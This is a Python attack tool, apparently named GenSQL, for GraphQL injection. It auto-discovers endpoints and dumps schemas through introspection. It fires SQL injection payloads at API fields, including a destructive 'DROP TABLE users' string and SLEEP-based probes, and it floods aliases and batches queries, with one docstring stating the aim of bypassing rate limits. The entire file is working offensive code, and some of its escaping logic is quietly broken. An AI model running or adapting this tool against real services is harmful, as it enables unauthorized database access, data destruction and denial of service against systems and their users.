#!/usr/bin/env python
"""GenSQL Technique: Advanced GraphQL Injection. Author: Jeevraj"""
import re, json, urllib.request, urllib.parse, urllib.error, time, random

GRAPHQL_ENDPOINTS = ["/graphql","/api/graphql","/v1/graphql","/graphiql",
    "/graph","/gql","/query","/api/query","/graphql/v1","/graphql/console",
    "/api/v1/graphql","/graphql-explorer","/graphql/playground"]

INTROSPECTION_QUERY = """{ __schema { queryType { name }
  types { name kind fields { name type { name kind ofType { name kind } } } }
} }"""

class GraphQLInjector:
    """Advanced GraphQL injection: introspection, batching, alias flooding, fragment injection."""

    SQLI_PAYLOADS = [
        "1' OR '1'='1",
        "1 UNION SELECT null,null--",
        "' AND SLEEP(3)--",
        "1; DROP TABLE users--",
        "' OR 1=1--",
        "",
        "{{7*7}}",
        "'test'",
        "\n{__typename}",
    ]

    def __init__(self, do_introspect=True, timeout=15):
        self.do_introspect = do_introspect
        self.timeout       = timeout
        self._schema       = None
        self._findings     = []

    def detect_graphql_endpoint(self, base_url):
        """Auto-discover GraphQL endpoints by probing common paths."""
        found = []
        base = base_url.rstrip("/")
        for path in GRAPHQL_ENDPOINTS:
            url = base + path
            try:
                resp = self._query(url, '{"query":"{__typename}"}')
                if resp and "data" in str(resp.get("body","")):
                    found.append(url)
            except Exception:
                pass
        return found

    def introspection_query(self, endpoint):
        """Run full introspection and return schema dict."""
        body = json.dumps({"query": INTROSPECTION_QUERY})
        resp = self._query(endpoint, body)
        if resp:
            try:
                data = json.loads(resp["body"])
                self._schema = data.get("data",{}).get("__schema",{})
                return self._schema
            except Exception:
                pass
        return {}

    def get_injectable_fields(self, endpoint):
        """Return list of fields that accept string/ID arguments (potential injection points)."""
        schema = self._schema or self.introspection_query(endpoint)
        fields = []
        for t in schema.get("types",[]):
            if t.get("kind") == "OBJECT" and not t["name"].startswith("__"):
                for f in (t.get("fields") or []):
                    fields.append("%s.%s" % (t["name"], f["name"]))
        return fields

    def inject_field(self, endpoint, field_name, payload, parent_type=None):
        """Inject payload into a specific GraphQL field."""
        parent = parent_type or "Query"
        query = '{"query":"{ %s(%s: \"%s\") }"}'  % (field_name, "id", payload.replace('"', '\\"'))
        return self._query(endpoint, query)

    def batch_attack(self, endpoint, base_query, count=100):
        """Send batch of repeated queries in one request to test batching limits."""
        queries = [{"query": base_query, "operationName": "Q%d" % i} for i in range(count)]
        body = json.dumps(queries)
        start = time.time()
        resp = self._query(endpoint, body)
        elapsed = time.time() - start
        return {"response": resp, "elapsed_ms": int(elapsed*1000), "count": count}

    def alias_flooding(self, endpoint, field, count=50, with_payload=True):
        """Generate alias-flooded query to bypass rate limits and inject into multiple aliases."""
        payload_val = random.choice(self.SQLI_PAYLOADS) if with_payload else "1"
        aliases = ["a%d: %s(id: \"%s\")" % (i, field, payload_val.replace('"','\\"'))
                   for i in range(count)]
        query = '{"query":"{ %s }"}'  % " ".join(aliases)
        return self._query(endpoint, query)

    def fragment_injection(self, endpoint, type_name, payload):
        """Fragment-based injection vector."""
        query = json.dumps({
            "query": ("fragment F on %s { id } "
                      "query { node(id: \"%s\") { ...F } }") % (type_name, payload.replace('"', '\"'))
        })
        return self._query(endpoint, query)

    def persisted_query_injection(self, endpoint, apq_hash, payload):
        """Automatic Persisted Query injection."""
        body = json.dumps({
            "extensions": {
                "persistedQuery": {"version": 1, "sha256Hash": apq_hash}
            },
            "variables": {"id": payload}
        })
        return self._query(endpoint, body)

    def field_suggestion_abuse(self, endpoint):
        """Trigger field name suggestions to enumerate schema fields when introspection is disabled."""
        probes = ["__schema","__type","_schema","schema","admin","user","password","token"]
        results = []
        for probe in probes:
            body = json.dumps({"query": "{ %s }" % probe})
            resp = self._query(endpoint, body)
            if resp and "Did you mean" in str(resp.get("body","")):
                m = re.findall(r'Did you mean[^?]+\?["\s]+(\w+)', str(resp["body"]))
                results.extend(m)
        return list(set(results))

    def boolean_sqli(self, endpoint, field, true_payload, false_payload):
        """Boolean-based SQLi via GraphQL field."""
        true_resp  = self.inject_field(endpoint, field, true_payload)
        false_resp = self.inject_field(endpoint, field, false_payload)
        return {
            "injectable": (str(true_resp) != str(false_resp)),
            "true_len":   len(str(true_resp)),
            "false_len":  len(str(false_resp)),
        }

    def _query(self, endpoint, body):
        try:
            data = body.encode("utf-8") if isinstance(body,str) else body
            req  = urllib.request.Request(endpoint, data=data,
                headers={"Content-Type":"application/json","Accept":"application/json",
                         "User-Agent":"Mozilla/5.0 GenSQL/2.0"})
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return {"status": r.status, "body": r.read().decode("utf-8","replace")}
        except Exception as ex:
            return {"error": str(ex)}
